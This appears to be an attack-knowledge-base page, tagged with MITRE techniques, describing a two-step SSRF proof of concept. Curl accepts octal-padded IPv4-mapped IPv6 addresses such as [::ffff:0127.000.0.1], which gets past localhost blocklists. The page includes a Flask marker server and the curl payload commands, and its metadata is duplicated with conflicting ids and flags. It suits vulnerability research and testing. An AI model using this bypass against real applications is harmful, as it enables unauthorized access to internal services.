---
tags:
  - ssrf
  - curl
  - ipv6
  - localhost-bypass
  - rfi
  - lfi
  - rce
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/Flask]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Linux
  - macOS
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Demonstrate-Curl-SSRF-with-Octal-IPv6]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:09:00.632Z'
description: >-
  Demonstrates SSRF vulnerability in curl by exploiting incorrect parsing of
  octal numbers in IPv4-mapped IPv6 addresses to bypass localhost blocklists.
skill_level: intermediate
impact_level: high
id: b507e997-9a23-42fa-be6c-aee087a8138e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174000
name: SSRF Bypass in Curl via Octal IPv4-Mapped IPv6 Addresses
type: attack_chain
description: "Demonstrates SSRF vulnerability in curl by exploiting incorrect parsing of octal numbers in IPv4-mapped IPv6 addresses to bypass localhost blocklists."
verified: false
submitted: false
step_count: 2
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Demonstrate-Curl-SSRF-with-Octal-IPv6]]
techniques: [[Exploit Public-Facing Application]]
tactics: [[Initial Access]]
tags: [ssrf, curl, ipv6, localhost-bypass, rfi, lfi, rce]
platforms: [Linux, macOS, Web]
tools: [[tools/curl]], [[tools/Flask]]
---

# SSRF Bypass in Curl via Octal IPv4-Mapped IPv6 Addresses

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Local Server] --> B[Execute SSRF Payload]
    B --> C[Verify Localhost Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Flask]]
- [[tools/curl]]

### Target Environment

- Target OS/Platform: Linux or macOS with curl version 8.7.1 or below
- Required services/ports: Local HTTP server on port 80
- Network access requirements: Localhost access; applications using curl for URL fetching

### Initial Access Requirements

- Credential requirements: None (unauthenticated)
- Network position: Local or remote attacker targeting curl-dependent services
- Prior access needed: Access to invoke curl in a vulnerable application context

## Detailed Attack Procedures

### Step 1: Setup Local HTTP Server

procedure: [[procedures/Demonstrate-Curl-SSRF-with-Octal-IPv6]]

**Objective**: Establish a local server to capture SSRF requests and confirm localhost access.

**Instructions**: Use [[tools/Flask]] to create and run a simple HTTP server listening on port 80 that responds with a marker string on the root path.

```python
# Flask server setup (run with Python)
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return 'FindVuln'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, threaded=True)
```

**Expected Output**: Server starts and listens on 0.0.0.0:80, ready to receive requests.

**Success Indicators**:
- Server logs show it's bound to port 80
- No port conflicts or binding errors

### Step 2: Execute SSRF Payload with Curl

procedure: [[procedures/Demonstrate-Curl-SSRF-with-Octal-IPv6]]

**Objective**: Exploit curl's parsing flaw to connect to localhost despite IPv6-mapped address appearing invalid.

**Instructions**: Run the vulnerable curl command using the malformed IPv6 address. This strips leading zeros, resolving to 127.0.0.1.

Execute [[commands/curl-ssrf-poc-with-octal-ipv6]]:

```bash
curl http://[::ffff:0127.000.0.1]/
```

For verbose testing on platforms where it may reject, use [[commands/curl-verbose-ipv6-test]]:

```bash
curl -g 'http://[::ffff:0127.0.0.1]/' -v -o /dev/null
```

**Expected Output**: On affected systems (e.g., macOS), returns 'FindVuln' from local server. On Linux, may reject with "Bad IPv6 address".

**Success Indicators**:
- Response contains 'FindVuln', confirming SSRF to localhost
- Verbose output shows connection to 127.0.0.1

## Attack Chain Summary

### Key Achievements

1. Bypassed localhost blocklists using octal-padded IPv4 in IPv6-mapped format
2. Demonstrated SSRF, enabling RFI/LFI in curl-dependent apps
3. Highlighted platform inconsistencies (macOS vs. Linux) in address parsing

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
